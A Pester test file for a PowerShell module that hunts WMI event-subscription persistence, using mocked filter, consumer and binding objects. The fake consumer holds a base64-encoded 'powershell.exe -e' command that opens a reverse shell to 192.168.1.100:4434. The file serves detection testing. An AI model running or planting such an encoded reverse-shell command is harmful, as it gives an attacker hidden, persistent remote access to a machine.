# Persistence.tests.ps1
$CorePath = "$PSScriptRoot\..\Modules\Core.psm1"
$PersistencePath = "$PSScriptRoot\..\Modules\PersistenceHunting.psm1"

Describe "Persistence Hunting Capabilities" {

    BeforeAll {
        Import-Module $CorePath -Force
        Import-Module $PersistencePath -Force
    }

    Context "WMI Persistence Detection" {

        It "Should detect a malicious WMI Event Subscription" {
            # Create fake WMI objects to be returned by the mock
            $fakeFilter = [pscustomobject]@{
                Name = 'EvilFilter';
                Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process"';
                __CLASS = '__EventFilter'
            }
            $fakeConsumer = [pscustomobject]@{
                Name = 'EvilConsumer';
                CommandLineTemplate = 'powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0ACgA=';
                __CLASS = 'CommandLineEventConsumer'
            }
            $fakeBinding = [pscustomobject]@{
                Filter = '__EventFilter.Name="EvilFilter"';
                Consumer = 'CommandLineEventConsumer.Name="EvilConsumer"'
            }

            # Mock Get-WmiObject to return our fake malicious objects
            Mock -CommandName Get-WmiObject -MockWith {
                param($Namespace, $Class)
                if ($Class -eq '__EventFilter') { return $fakeFilter }
                if ($Class -eq '__EventConsumer') { return $fakeConsumer }
                if ($Class -eq '__FilterToConsumerBinding') { return $fakeBinding }
            }

            Clear-AuditFindings
            Invoke-PersistenceHunting -Config $null # Config not needed for this test

            $findings = Get-AuditFindings
            $wmiFinding = $findings | Where-Object { $_.Id -eq 'Persist_WMI' }

            # Assert that a critical finding was created
            $wmiFinding.Severity | Should Be 0 # FAIL
            $wmiFinding.Value | Should Match "1 subscription"
        }
    }
}